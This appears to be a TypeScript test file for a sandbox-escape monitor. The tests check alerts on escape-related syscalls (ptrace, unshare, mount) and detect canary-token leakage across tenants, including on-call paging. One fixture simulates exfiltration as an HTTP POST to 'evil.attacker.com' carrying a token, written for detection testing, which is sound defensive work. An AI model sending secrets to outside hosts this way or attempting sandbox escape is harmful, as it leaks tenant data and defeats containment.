import { describe, it, expect } from "vitest";
import fs from "node:fs";
import path from "node:path";
import {
  SandboxEscapeMonitor,
  type SyscallAnomalyEvent,
} from "../../packages/common/src/sandbox-monitor.js";

describe("Sandbox Escape Monitoring & Canary Leakage Detection", () => {
  const fixturesPath = path.resolve(
    __dirname,
    "../sandbox_fixtures/anomaly_events.json",
  );

  it("detects escape-attempt fixtures and generates critical alert paging on-call", async () => {
    expect(fs.existsSync(fixturesPath)).toBe(true);
    const rawEvents: SyscallAnomalyEvent[] = JSON.parse(
      fs.readFileSync(fixturesPath, "utf8"),
    );

    const monitor = new SandboxEscapeMonitor();
    const result = await monitor.evaluateSyscalls(rawEvents);

    expect(result.hasAlert).toBe(true);
    expect(result.violations.length).toBe(4);
    expect(result.alert).toBeDefined();

    const dispatched = monitor.getDispatchedAlerts();
    expect(dispatched.length).toBe(1);
    expect(dispatched[0].type).toBe("sandbox_escape_attempt");
    expect(dispatched[0].severity).toBe("critical");
    expect(dispatched[0].pagedOnCall).toBe(false); // No notifier configured: defaults to false
    expect(dispatched[0].details.syscalls).toContain("ptrace");
    expect(dispatched[0].details.syscalls).toContain("unshare");
    expect(dispatched[0].details.syscalls).toContain("mount");
  });

  it("does not alert on benign normal syscall events", async () => {
    const normalEvents: SyscallAnomalyEvent[] = [
      {
        pid: 100,
        syscall: "read",
        executable: "/usr/bin/node",
        blocked: false,
        timestamp: new Date().toISOString(),
        anomalyType: "unauthorized_syscall", // benign syscall name
      },
    ];

    const monitor = new SandboxEscapeMonitor();
    // Overwrite benign syscall to not be in dangerous set
    normalEvents[0].anomalyType = undefined as any;
    const result = await monitor.evaluateSyscalls(normalEvents);

    expect(result.hasAlert).toBe(false);
    expect(result.violations).toHaveLength(0);
    expect(monitor.getDispatchedAlerts()).toHaveLength(0);
  });

  it("generates canary secrets and pages on simulated leakage probe with active notifier", async () => {
    const monitor = new SandboxEscapeMonitor({ notifier: () => true });
    const tenantId = "tenant-fintech-9";

    const canaryToken = monitor.generateCanarySecret(tenantId);
    expect(canaryToken).toMatch(new RegExp(`^airp_canary_${tenantId}_[a-f0-9]{32}$`));

    // Negative check: clean payload has no leakage
    const cleanPayload = "Standard worker process output: test suite passed with 0 errors.";
    const cleanResult = await monitor.detectCanaryLeakage(cleanPayload, tenantId);
    expect(cleanResult.leaked).toBe(false);

    // Simulated leakage probe: canary token leaked into egress / logs
    const leakedLog = `POST /telemetry HTTP/1.1\nHost: evil.attacker.com\nAuthorization: Bearer ${canaryToken}`;
    const leakResult = await monitor.detectCanaryLeakage(leakedLog, tenantId);

    expect(leakResult.leaked).toBe(true);
    expect(leakResult.matchedToken).toBe(canaryToken);
    expect(leakResult.alert).toBeDefined();
    expect(leakResult.alert?.severity).toBe("critical");
    expect(leakResult.alert?.pagedOnCall).toBe(true);
    expect(leakResult.alert?.summary).toContain(`tenant '${tenantId}'`);

    const dispatched = monitor.getDispatchedAlerts();
    expect(dispatched.some((a) => a.type === "canary_token_leakage")).toBe(true);
  });

  it("checks multiple issued canaries across tenants and supports custom alert notifiers", async () => {
    let notifiedAlert: any = null;
    const monitor = new SandboxEscapeMonitor({
      notifier: (alert) => {
        notifiedAlert = alert;
        return true;
      },
    });

    const tokenA = monitor.generateCanarySecret("tenant-alpha");
    const tokenB = monitor.generateCanarySecret("tenant-beta");
    expect(tokenA).toBeDefined();

    // Payload contains tenant-beta token, but we filter for tenant-alpha: no match
    const payloadBeta = `Accessing external endpoint with ${tokenB}`;
    const resultAlpha = await monitor.detectCanaryLeakage(payloadBeta, "tenant-alpha");
    expect(resultAlpha.leaked).toBe(false);

    // Filter matches tenant-beta: leak detected and custom notifier called
    const resultBeta = await monitor.detectCanaryLeakage(payloadBeta, "tenant-beta");
    expect(resultBeta.leaked).toBe(true);
    expect(resultBeta.matchedToken).toBe(tokenB);
    expect(resultBeta.alert?.pagedOnCall).toBe(true);
    expect(notifiedAlert).toBeDefined();
    expect(notifiedAlert?.details.tenantId).toBe("tenant-beta");
  });

  it("reports paged on-call only after an async notifier confirms delivery", async () => {
    const delivered = new SandboxEscapeMonitor({ notifier: async () => true });
    const failed = new SandboxEscapeMonitor({ notifier: async () => false });
    const rejected = new SandboxEscapeMonitor({
      notifier: async () => {
        throw new Error("alertmanager unreachable");
      },
    });

    for (const [monitor, expected] of [
      [delivered, true],
      [failed, false],
      [rejected, false],
    ] as const) {
      const token = monitor.generateCanarySecret("tenant-async");
      const result = await monitor.detectCanaryLeakage(`egress ${token}`, "tenant-async");
      expect(result.leaked).toBe(true);
      expect(result.alert?.pagedOnCall).toBe(expected);
    }
  });
});
